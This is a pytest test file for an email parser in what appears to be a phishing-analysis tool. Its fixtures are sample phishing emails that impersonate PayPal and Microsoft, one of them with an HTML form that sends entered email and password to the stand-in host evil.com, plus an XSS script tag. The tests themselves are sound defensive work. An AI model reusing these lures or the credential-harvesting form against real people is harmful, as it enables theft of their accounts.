"""
Tests for the Email Parser Engine.
"""
import pytest
from app.engines.email_parser import EmailParser

parser = EmailParser()

SAMPLE_EML = b"""From: "John Smith" <john@example.com>
To: analyst@company.com
Subject: Urgent: Your Account Has Been Suspended
Date: Wed, 25 Jun 2026 10:00:00 -0400
Message-ID: <test123@example.com>
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"
Return-Path: <bounce@different-domain.com>
Reply-To: reply@suspicious-domain.xyz
Authentication-Results: mx.google.com;
    spf=fail (google.com: domain of john@example.com does not designate 1.2.3.4 as permitted sender)
    smtp.mailfrom=john@example.com;
    dkim=pass header.d=example.com;
    dmarc=fail (p=REJECT) header.from=example.com
Received: from mail-server.example.com (1.2.3.4) by mx.google.com

Dear Customer,

Your account has been suspended due to unauthorized activity.
Please click here to verify your identity immediately: http://login-paypa1.xyz/verify
Failure to respond within 24 hours will result in permanent account closure.

Best regards,
PayPal Security Team
"""

SAMPLE_HTML_EML = b"""From: "Support" <support@micros0ft-verify.tk>
To: victim@company.com
Subject: RE: RE: Action Required - Password Expiry
Date: Wed, 25 Jun 2026 10:00:00 -0400
Message-ID: <html-test@example.com>
MIME-Version: 1.0
Content-Type: text/html; charset="utf-8"

<html>
<body>
<p>Your password will expire in 2 hours. Click below to update:</p>
<a href="http://micros0ft-login.xyz/update">Update Password Now</a>
<form action="http://evil.com/steal">
<input type="text" name="email" placeholder="Enter email">
<input type="password" name="password" placeholder="Enter password">
</form>
<script>alert('xss')</script>
</body>
</html>
"""


def test_parse_eml_basic():
    metadata, attachments, headers = parser.parse_eml(SAMPLE_EML)
    assert metadata.sender_email == "john@example.com"
    assert metadata.sender_name == "John Smith"
    assert metadata.subject == "Urgent: Your Account Has Been Suspended"
    assert metadata.recipient == "analyst@company.com"
    assert metadata.message_id == "<test123@example.com>"
    assert "paypa1.xyz" in metadata.body_text


def test_parse_eml_return_path():
    metadata, _, headers = parser.parse_eml(SAMPLE_EML)
    assert metadata.return_path is not None
    assert "different-domain.com" in metadata.return_path


def test_parse_eml_reply_to():
    metadata, _, _ = parser.parse_eml(SAMPLE_EML)
    assert metadata.reply_to is not None
    assert "suspicious-domain.xyz" in metadata.reply_to


def test_parse_html_eml():
    metadata, _, _ = parser.parse_eml(SAMPLE_HTML_EML)
    assert metadata.sender_email == "support@micros0ft-verify.tk"
    assert metadata.body_html is not None
    # Script tags should be sanitized
    assert "<script>" not in (metadata.body_html or "")


def test_parse_raw_headers():
    raw = "From: test@example.com\nTo: dest@test.com\nSubject: Test\nDate: Wed, 25 Jun 2026 10:00:00"
    metadata, _, headers = parser.parse_raw_headers(raw)
    assert metadata.sender_email == "test@example.com"
    assert "Test" in metadata.subject


def test_no_attachments():
    _, attachments, _ = parser.parse_eml(SAMPLE_EML)
    assert len(attachments) == 0
